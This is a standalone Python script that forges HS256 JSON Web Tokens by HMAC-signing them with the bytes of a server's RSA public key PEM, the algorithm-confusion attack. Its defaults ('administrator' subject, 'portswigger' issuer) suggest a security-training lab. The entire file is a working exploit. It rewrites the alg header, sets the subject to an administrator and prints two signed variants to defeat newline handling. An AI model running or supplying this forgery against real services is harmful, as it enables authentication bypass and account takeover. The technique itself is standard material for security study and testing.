#!/usr/bin/env python3
"""Forge an HS256 JWT by HMAC-signing with the PEM bytes of a public key.

This implements the algorithm-confusion forgery by hand (no PyJWT) so the
byte-level detail is visible: the HMAC key is the raw PEM file content. The
trailing newline matters, so this emits BOTH variants.

    python3 -I forge_hs256.py key.pem --sub administrator --kid 34982dd3-...

If you pass an existing token with --from-token, its header kid and payload
are reused and only `sub` (and alg) are changed, matching what jwt_tool does.

Requires: nothing beyond the standard library.
"""
import argparse
import base64
import hashlib
import hmac
import json
import time


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def b64url_json(obj: dict) -> str:
    # Compact separators keep the encoding stable and minimal.
    return b64url(json.dumps(obj, separators=(",", ":")).encode("utf-8"))


def decode_segment(seg: str) -> dict:
    padding = "=" * (-len(seg) % 4)
    return json.loads(base64.urlsafe_b64decode(seg + padding))


def sign(signing_input: str, secret: bytes) -> str:
    tag = hmac.new(secret, signing_input.encode("ascii"), hashlib.sha256).digest()
    return b64url(tag)


def main() -> int:
    parser = argparse.ArgumentParser(description="Forge HS256 token with public-key PEM")
    parser.add_argument("pem", help="path to the public key PEM")
    parser.add_argument("--sub", default="administrator", help="target sub claim")
    parser.add_argument("--kid", default=None, help="kid header (else taken from --from-token)")
    parser.add_argument("--iss", default="portswigger", help="iss claim")
    parser.add_argument("--exp-skew", type=int, default=3600,
                        help="seconds from now for exp (if not using --from-token)")
    parser.add_argument("--from-token", default=None,
                        help="reuse header kid + payload from this RS256 token")
    args = parser.parse_args()

    with open(args.pem, "rb") as fh:
        pem_bytes = fh.read()

    pem_with_nl = pem_bytes if pem_bytes.endswith(b"\n") else pem_bytes + b"\n"
    pem_without_nl = pem_bytes.rstrip(b"\n")

    if args.from_token:
        h_seg, p_seg, _ = args.from_token.split(".")
        header = decode_segment(h_seg)
        payload = decode_segment(p_seg)
    else:
        header = {"kid": args.kid}
        payload = {"iss": args.iss, "exp": int(time.time()) + args.exp_skew}

    header["alg"] = "HS256"
    header["typ"] = header.get("typ", "JWT")
    if args.kid:
        header["kid"] = args.kid
    payload["sub"] = args.sub

    signing_input = f"{b64url_json(header)}.{b64url_json(payload)}"

    token_a = f"{signing_input}.{sign(signing_input, pem_with_nl)}"
    token_b = f"{signing_input}.{sign(signing_input, pem_without_nl)}"

    print("# Variant A: PEM WITH trailing newline (try first)")
    print(token_a)
    print()
    print("# Variant B: PEM WITHOUT trailing newline (fallback)")
    print(token_b)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
